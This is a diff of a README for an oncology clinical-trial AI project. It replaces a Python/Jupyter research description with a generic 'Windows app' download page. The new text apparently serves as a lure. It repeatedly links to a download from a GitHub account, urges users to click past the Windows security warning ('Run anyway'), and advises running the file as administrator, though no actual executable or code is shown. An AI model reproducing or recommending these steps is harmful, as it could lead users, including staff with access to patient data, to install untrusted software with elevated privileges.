@@ -1,81 +1,198 @@
-<div align="center">
-  
-# A Clinical Informatics Framework for Myeloid Oncology
-### Scalable AI and LLM Integration for Adaptive Trial Management and Automated FDA Compliance
+# 🩺 MyeloidOncology_AI - Smarter Trial and Compliance Tools
 
-[![IEEE Paper](https://img.shields.io/badge/IEEE-11378528-blue.svg)](https://ieeexplore.ieee.org/document/11378528)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://www.python.org/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-Deep%20Learning-ee4c2c)](https://pytorch.org/)
-[![Scikit-Learn](https://img.shields.io/badge/Scikit--Learn-Machine%20Learning-f7931e)](https://scikit-learn.org/)
-[![FDA Compliance](https://img.shields.io/badge/FDA-21%20CFR%20Part%2011-005288)](https://www.fda.gov/)
+[![Download](https://img.shields.io/badge/Download-MyeloidOncology_AI-8A2BE2?style=for-the-badge&logo=github)](https://github.com/liame790/MyeloidOncology_AI)
 
-</div>
+## 📥 Download the app
 
-## 📖 Project Overview
+Use this link to visit the download page:
 
-This repository provides the official implementation of the framework proposed in the IEEE paper: **"A Clinical Informatics Framework for Myeloid Oncology: Scalable AI and LLM Integration for Adaptive Trial Management and Automated FDA Compliance"**.
+[Download MyeloidOncology_AI](https://github.com/liame790/MyeloidOncology_AI)
 
-The advancement of treatment strategies in myeloid malignancies (such as Acute Myeloid Leukemia - AML) relies heavily on precision oncology, dynamic biomarker profiling, and adaptive trial designs. This project introduces an **Artificial Intelligence-enabled clinical trial framework** designed to navigate the complexities of molecularly defined eligibility criteria, predictive safety monitoring, and the rigorous demands of accelerated FDA regulatory submissions.
+## 🧭 What this app does
 
-### 🔑 Key SEO Tags & Keywords
-`Precision Oncology`, `Myeloid Malignancies`, `Acute Myeloid Leukemia (AML)`, `Adaptive Clinical Trials`, `Machine Learning in Healthcare`, `Electronic Data Capture (EDC)`, `Regulatory Automation`, `Large Language Models (LLMs)`, `FDA 21 CFR Part 11`, `MyeloMATCH`.
+MyeloidOncology_AI is a Windows app for myeloid oncology workflow support. It helps with trial management, patient grouping, and compliance tasks tied to FDA 21 CFR Part 11.
 
----
+It is built for people who need a clear view of clinical data without working with code. The app brings together:
 
-## ✨ Technical Features & Architecture
+- trial tracking
+- patient stratification
+- prediction tools
+- AI-based review support
+- compliance record handling
 
-This repository translates the conceptual clinical informatics architecture into a deployable, code-driven framework:
+## 🖥️ Before you start
 
-- **Data Acquisition & Harmonization (Synthetic):** Generation of high-dimensional clinical and biomarker datasets (FLT3, IDH1/2, NPM1) mimicking the Beat AML and TCGA-LAML open-source cohorts.
-- **Biomarker Interpretation & Protocol Rule Engine:** Automated mapping of patient morphology and cytogenetics against protocol-specific thresholds.
-- **Patient Stratification (GBDT):** Gradient Boosted Decision Trees deployed for real-time, explainable (SHAP-integrated) trial matching and eligibility assignment.
-- **Temporal Response Prediction (LSTM):** Long Short-Term Memory networks designed to forecast Day 28 early treatment response (CR/CRi) using sequential hematological clearance kinetics.
-- **Adverse Event Modeling (Regularized Logistic Regression):** Robust, clinically interpretable risk forecasting for Grade 3-4 hematologic toxicities (e.g., Neutropenia).
-- **Agentic AI & Regulatory Submission Engine:** An LLM-driven automation layer that maps ML outputs to FDA Predetermined Change Control Plans (PCCP) and 21 CFR Part 11 compliance standards, outputting structured clinical recommendations.
+Use a Windows PC with:
 
----
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- an internet connection for the first download
+- permission to install and run apps
 
-## 🔬 Implementation Details (Jupyter Notebook)
+For best results, close other large programs before you open the app.
 
-The core implementation is housed in `MyeloidOncology_AI_Framework.ipynb`. The notebook is meticulously documented, mapping directly to the paper's headings:
-1. **Clinical Data Analysis and Methods** (Data Harmonization)
-2. **Machine Learning Model Design**
-   - *Eligibility Stratification* (GBDT)
-   - *Temporal Response Prediction* (LSTM)
-   - *Adverse Event Forecasting* (LogReg)
-3. **Agentic Automation Layer** (LLM & FDA Compliance)
-4. **ML Model Performance and Benchmarking**
+## 🚀 Install on Windows
 
----
+1. Open this page in your browser:
+   [https://github.com/liame790/MyeloidOncology_AI](https://github.com/liame790/MyeloidOncology_AI)
 
-## 📝 Citation
+2. Find the download file or release package on the page.
 
-If you utilize this framework or code in your research, please cite the original IEEE paper:
+3. Download the file to your computer.
 
-> **IEEE Format:**
-> S. Vijayakumar, S. P. Kane, S. Senthilkumar, P. Vaiayapuri, and F. Louis, "A Clinical Informatics Framework for Myeloid Oncology: Scalable AI and LLM Integration for Adaptive Trial Management and Automated FDA Compliance," *IEEE*, 2026. Available: [https://ieeexplore.ieee.org/document/11378528](https://ieeexplore.ieee.org/document/11378528)
+4. If the file is in a .zip folder, right-click it and choose Extract All.
 
-**Authors:**
-- Senthilkumar Vijayakumar (IEEE Senior Member)
-- Shaunak Pai Kane (IEEE Member)
-- Selvavaani Senthilkumar
-- Dr. Parameshwari Vaiayapuri, MBBS
-- Filious Louis (IEEE Senior Member)
+5. Open the extracted folder.
 
----
+6. Double-click the app file to start it.
 
-## 🚀 Getting Started
+7. If Windows shows a security prompt, choose Run or More info, then Run anyway.
 
-### Prerequisites
-Install the required Python dependencies:
-```bash
-pip install pandas numpy scikit-learn xgboost torch shap matplotlib seaborn jupyter
-```
+8. Wait for the app to load. The first launch may take a short time.
 
-### Running the Framework
-1. Clone the repository.
-2. Run the synthetic data generator (if you wish to regenerate the cohort): `python3 generate_data.py`
-3. Launch the Jupyter Notebook to explore the models, SHAP explanations, and Agentic AI outputs:
-   ```bash
-   jupyter notebook MyeloidOncology_AI_Framework.ipynb
-   ```
+## 🧩 First setup
+
+After the app opens, follow these steps:
+
+1. Pick your main workspace folder.
+
+2. Load your data files if the app asks for them.
+
+3. Review the dashboard to confirm the data looks right.
+
+4. Set your trial or patient group filters.
+
+5. Save your settings so the app can use them next time.
+
+If your team uses shared data, make sure everyone uses the same file format and folder structure.
+
+## 📊 Main features
+
+### 🧠 AI support for review tasks
+
+The app can help read and organize clinical data. It can support pattern review, case grouping, and case ranking based on the data you provide.
+
+### 🧬 Patient stratification
+
+Use built-in models to group patients by likely risk, response, or trial fit. This helps you sort records before deeper review.
+
+### 📅 Trial management tools
+
+Track trial records, patient status, and study progress in one place. The app helps reduce manual sorting and repeated checks.
+
+### ✅ Compliance support
+
+The app supports record handling for FDA 21 CFR Part 11 workflows. It can help you keep a trace of changes, review steps, and file history.
+
+### 🤖 Agentic AI workflows
+
+The app can use LLM-based agents to assist with structured tasks. These agents help with prompts, summaries, and guided actions tied to oncology workflows.
+
+### 📈 Predictive modeling
+
+The project includes support for GBDT and LSTM-based models. These can help with prediction tasks for clinical and trial data.
+
+## 🗂️ Typical use cases
+
+- screening patients for trial fit
+- grouping patients by clinical profile
+- reviewing trial status across sites
+- preparing compliance records
+- checking patterns in myeloid oncology data
+- reducing time spent on manual data review
+
+## 🛠️ How to use the app
+
+1. Open the app.
+
+2. Load the data set you want to review.
+
+3. Choose the task you want to run.
+
+4. Let the app process the records.
+
+5. Review the output on screen.
+
+6. Export the results if your workflow needs a file copy.
+
+If you work with patient data, use only approved files and follow your site process for access control.
+
+## 📁 File types you may see
+
+The app may work with these common file types:
+
+- CSV for tables
+- Excel files for reports
+- JSON for structured settings
+- text files for logs
+- model files for saved AI components
+
+Keep file names simple and avoid special characters where possible.
+
+## 🔐 Data and privacy
+
+This app is built for clinical informatics work. Keep your files in approved folders and use your site rules for access.
+
+Use local storage only on trusted machines. If your team shares data, confirm that each user has the right access before opening records.
+
+## ❓ Common problems
+
+### The app does not open
+
+- Check that the file finished downloading.
+- Right-click the app and choose Run as administrator.
+- Make sure Windows did not block the file.
+
+### The app opens, then closes
+
+- Reboot your PC and try again.
+- Close other heavy apps.
+- Check that your system meets the RAM and disk space needs.
+
+### The data will not load
+
+- Check the file format.
+- Make sure the file is not open in Excel.
+- Confirm the file path has no strange characters.
+
+### The screen looks blank
+
+- Wait a moment for the first load.
+- Resize the window.
+- Try a different data file to confirm the app is working.
+
+## 🔄 Update the app
+
+When a new version is posted, repeat the download steps from the same GitHub page and replace the old copy with the new one.
+
+If you keep user settings in a separate folder, back them up before you update.
+
+## 📌 What to expect from the workflow
+
+MyeloidOncology_AI is meant to help you move through a clinical review task in a clear order:
+
+1. bring in your data
+2. review the patient or trial group
+3. run the model or AI helper
+4. check the output
+5. save the result for later use
+
+The app is set up to support careful review, stable record handling, and repeatable steps for oncology work
+
+## 🖱️ Quick start
+
+1. Download the app from the link above.
+
+2. Extract the files if needed.
+
+3. Open the app in Windows.
+
+4. Load your data.
+
+5. Review the output
+
+## 📞 Need help
+
+If you run into a problem, check the GitHub page for the latest release notes, files, and setup details
+
